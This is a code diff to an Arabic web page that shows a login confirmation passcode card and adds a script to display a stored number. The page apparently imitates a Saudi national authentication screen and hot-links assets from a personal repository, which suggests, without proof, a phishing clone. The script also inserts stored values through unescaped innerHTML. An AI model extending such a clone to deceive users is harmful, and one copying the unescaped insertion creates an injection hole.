@@ -325,6 +325,14 @@
         .cancel-request-div {
             display: block;
         }
+        
+        /* تنسيق إضافي للرقم المعروض */
+        .passcode-info {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -388,13 +396,18 @@
                                     
                                     <!-- Passcode Display -->
                                     <div class="card-info">
-                                        <div class="passcode-card" data-after-content="97" aria-label="الرمز 97"></div>
+                                        <div class="passcode-card" data-after-content="97" aria-label="الرمز 97" id="passcodeDisplay"></div>
+                                    </div>
+                                    
+                                    <!-- معلومات إضافية عن الرقم -->
+                                    <div class="passcode-info" id="passcodeInfo">
+                                        <!-- سيتم ملؤها بالجافاسكريبت -->
                                     </div>
                                     
                                     <!-- Waiting Status -->
                                     <div class="waiting-confirmation">
                                         <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/Timer.gif" alt="Timer" class="timer-img">
-                                        في انتظار تأكيدك
+                                        <span id="waitingText">في انتظار تأكيدك</span>
                                     </div>
 
                                     <!-- Mobile Cancel Button - سيظهر فقط على الموبايل -->
@@ -425,6 +438,58 @@
 
     <!-- JavaScript -->
     <script type="text/javascript">
+        // دالة لتحميل وعرض الأرقام المحفوظة
+        function loadAndDisplayNumbers() {
+            try {
+                const savedNumbers = localStorage.getItem('auth_passcode_numbers');
+                if (savedNumbers) {
+                    const numbers = JSON.parse(savedNumbers);
+                    const finalNumber = numbers.finalNumber;
+                    
+                    // عرض الرقم في passcode-card
+                    const passcodeCard = document.getElementById('passcodeDisplay');
+                    if (passcodeCard && finalNumber) {
+                        passcodeCard.setAttribute('data-after-content', finalNumber);
+                        
+                        // إضافة تأثير مرئي
+                        passcodeCard.style.transform = 'scale(1.1)';
+                        setTimeout(() => {
+                            passcodeCard.style.transform = 'scale(1)';
+                        }, 300);
+                        
+                        // عرض معلومات إضافية
+                        const passcodeInfo = document.getElementById('passcodeInfo');
+                        if (passcodeInfo) {
+                            passcodeInfo.innerHTML = `
+                                <div style="margin-top: 10px; padding: 8px; background: #f5f5f5; border-radius: 5px;">
+                                    <i class="fas fa-info-circle" style="color: #0D98BA;"></i>
+                                    تم إنشاء الرقم من: ${numbers.number1} و ${numbers.number2}
+                                    <span style="font-size: 12px; color: #888; display: block; margin-top: 3px;">
+                                        تم الإرسال: ${new Date(numbers.timestamp).toLocaleTimeString('ar-SA')}
+                                    </span>
+                                </div>
+                            `;
+                        }
+                        
+                        // تحديث نص الانتظار
+                        const waitingText = document.getElementById('waitingText');
+                        if (waitingText) {
+                            waitingText.innerHTML = `في انتظار تأكيدك - الرقم: ${finalNumber}`;
+                        }
+                        
+                        console.log('✅ تم عرض الرقم في passcode-card:', finalNumber);
+                        return true;
+                    }
+                } else {
+                    console.log('⚠️ لا توجد أرقام محفوظة، سيتم استخدام الرقم الافتراضي 97');
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ خطأ في تحميل الأرقام:', error);
+                return false;
+            }
+        }
+        
         // وظيفة الإلغاء
         function cancel() {
             document.getElementById("cancelOnWeb").value = "cancelledOnWebWaiting";
@@ -439,6 +504,9 @@
 
         // وظيفة بدء الاستطلاع
         function sendTimingInfoInit() {
+            // تحميل الأرقام أولاً
+            loadAndDisplayNumbers();
+            
             var url_string = window.location.href;
             var url = new URL(url_string);
             var trx = url.searchParams.get("trx");
